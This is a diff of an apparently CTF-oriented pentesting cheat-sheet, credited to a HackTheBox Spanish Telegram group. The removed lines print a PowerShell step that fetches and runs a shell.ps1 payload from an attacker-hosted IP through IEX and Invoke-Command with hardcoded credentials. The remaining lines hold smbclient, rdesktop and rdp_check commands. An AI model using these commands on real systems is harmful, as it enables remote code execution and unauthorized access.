@@ -1,10 +1,3 @@
-$username = "MACHINE\user"
-$password = "password"
-$secstr = New-Object -TypeName System.Security.SecureString
-$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
-Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.13.6:8000/shell.ps1') } -Credential $cred -Computer localhost
-
 POWERSHELL
 -------------------------------------
 1. 
@@ -79,3 +72,8 @@ smbclient \\\\10.10.10.10\\Users -U user pass
 
 rdp_check.py domain\user:pass@10.10.10.10
 rdesktop -d domain -u user -p pass 10.10.10.10
+
+
+Fuente
+---
+HackTheBox Hispano (Telegram)
